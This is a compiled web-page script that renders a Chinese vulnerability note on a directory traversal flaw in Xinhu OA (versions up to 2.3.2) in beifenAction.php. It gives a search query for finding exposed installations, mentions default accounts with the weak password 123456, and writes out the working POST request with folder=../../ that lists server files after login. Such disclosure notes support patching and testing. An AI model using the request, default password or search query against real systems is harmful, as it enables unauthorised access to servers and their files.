(window.webpackJsonp=window.webpackJsonp||[]).push([[77],{1617:function(t,a,s){t.exports=s.p+"assets/img/1637826393127-40e04bac-5443-4dd6-b5d4-b2e8e7e63606.c0c324d6.png"},1618:function(t,a,s){t.exports=s.p+"assets/img/1637826384345-ad90b308-7431-4a96-9baa-6808129967ea.433da705.png"},1619:function(t,a,s){t.exports=s.p+"assets/img/1637826483632-dc07740e-e0e5-4b6e-8ce3-e24ad1398db9.19540939.png"},1620:function(t,a,s){t.exports=s.p+"assets/img/1637826756244-21762aa4-adbe-453a-86e3-452e767df30e.97403502.png"},1621:function(t,a,s){t.exports=s.p+"assets/img/1637826832637-432df24d-758c-41c0-885e-ba6f79354ce4.76d2f36a.png"},2966:function(t,a,s){"use strict";s.r(a);var e=s(64),r=Object(e.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"信呼oa-beifenaction-php-后台目录遍历漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#信呼oa-beifenaction-php-后台目录遍历漏洞"}},[t._v("#")]),t._v(" 信呼OA beifenAction.php 后台目录遍历漏洞")]),t._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),a("p",[t._v("信呼OA beifenAction.php文件中调用了 getfilerows方法，导致了目录遍历漏洞，攻击者通过漏洞可以获取服务器上的文件信息")]),t._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("信呼OA <= 2.3.2")]),a("br"),t._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v('app="信呼协同办公系统"')]),a("br"),t._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),a("p",[t._v("登录页面")]),t._v(" "),a("p",[a("img",{attrs:{src:s(1617),alt:"img"}})]),t._v(" "),a("p",[t._v("其中默认存在几个用户存在弱口令 123456")]),t._v(" "),a("p",[a("img",{attrs:{src:s(1618),alt:"img"}})]),t._v(" "),a("p",[t._v("存在漏洞的文件为 "),a("code",[t._v("webmain/system/beifen/beifenAction.php")])]),t._v(" "),a("p",[a("img",{attrs:{src:s(1619),alt:"img"}})]),t._v(" "),a("p",[t._v("查看 "),a("code",[t._v("getfilerows()")]),t._v(" 方法，在 "),a("code",[t._v("include/chajian/fileChajian.php")])]),t._v(" "),a("p",[a("img",{attrs:{src:s(1620),alt:"img"}})]),t._v(" "),a("p",[t._v("该方法遍历目录下的文件名并输出，登录后，发送请求包")]),t._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[t._v("POST "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("index"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("php?a"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("getdatssss"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("m"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("beifen"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("d"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("system"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("ajaxbool"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("true\n\nfolder"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:s(1621),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=r.exports}}]);